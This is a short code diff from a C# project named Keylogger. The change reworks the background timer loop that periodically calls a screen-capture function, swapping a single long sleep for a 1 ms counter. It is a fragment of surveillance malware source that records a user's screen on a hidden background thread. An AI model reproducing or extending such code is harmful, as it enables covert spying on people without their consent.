@@ -84,14 +84,22 @@ namespace Keylogger
         #endregion
 
         #region timer
+        static int interval = 1;
         static void StartTimer()
         {
             Thread thread = new Thread(() =>
             {
                 while (true)
                 {
-                    Thread.Sleep(captureTime);
-                    CaptureScreen();
+                    Thread.Sleep(1);
+
+                    if (interval % captureTime == 0)
+                        CaptureScreen();
+
+                    interval++;
+
+                    if (interval >= 1000000)
+                        interval = 0;
                 }
             });
             thread.IsBackground = true;
